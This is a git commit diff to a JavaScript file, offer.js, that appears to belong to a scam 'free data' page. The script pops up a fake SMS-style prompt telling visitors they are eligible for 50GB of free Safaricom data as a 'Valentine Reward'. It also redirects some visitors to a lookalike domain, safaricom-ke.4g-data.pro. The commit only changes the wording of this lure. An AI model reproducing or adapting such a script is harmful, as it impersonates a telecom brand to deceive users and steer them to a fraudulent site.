e5568b7853cf585404c58d8919017b3db55cccc8
newsrock <newsrock3345@gmail.com>
2025-02-12 13:26:19 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '50GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive KES400 Airtime and 50GB Free Data safaricom Old Sim Reward, Kindly Press OK to ACTIVATE ','50GB Free Data');
+password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data Valentine Reward Valid For 30days, Kindly Press OK to ACTIVATE ','50GB Free Data');
 if (password != '50GB Free Data') {
 location.href='https://safaricom-ke.4g-data.pro/15GB';
 }
